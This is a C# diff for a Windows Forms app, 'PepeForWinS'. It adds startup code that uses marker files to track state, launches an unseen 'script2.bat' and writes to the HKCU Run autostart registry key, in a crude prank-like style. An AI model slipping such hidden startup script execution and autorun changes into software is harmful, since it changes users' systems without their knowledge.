@@ -7,6 +7,9 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using System.IO;
+using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace PepeForWinS
 {
@@ -15,8 +18,50 @@ namespace PepeForWinS
         public Form1()
         {
             InitializeComponent();
+            if (File.Exists("textsuka2.txt"))
+            {
+                Form6 fr6 = new Form6();
+                this.Hide();
+                fr6.ShowDialog();
+                this.Show();
+                File.Delete("text.txt");
+                File.Delete("textsuka.txt");
+                File.Delete("textsuka2.txt");
+                string progName = "";
+                string run = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";
+                Registry.SetValue(run, "Prog", progName);
+            }
+            Fuck();
         }
+        public void Fuck()
+        {
+            if (File.Exists("text.txt"))
+            {
+                Process.Start("script2.bat");
+                using (FileStream fs = File.Create("textsuka.txt"))
+                {
+                    string info = "";
+                    using (var sr = new StreamWriter(fs))
+                    {
+                        sr.Write(info);
+                    }
+                }
+            }
 
+            if (File.Exists("textsuka.txt"))
+            {
+                File.Delete("text.txt");
+                using (FileStream fs1 = File.Create("textsuka2.txt"))
+                {
+                    string info = "";
+                    using (var sr = new StreamWriter(fs1))
+                    {
+                        sr.Write(info);
+                    }
+                }
+
+            }
+        }
         private void Button1_Click(object sender, EventArgs e)
         {
             Form2 fr2 = new Form2();
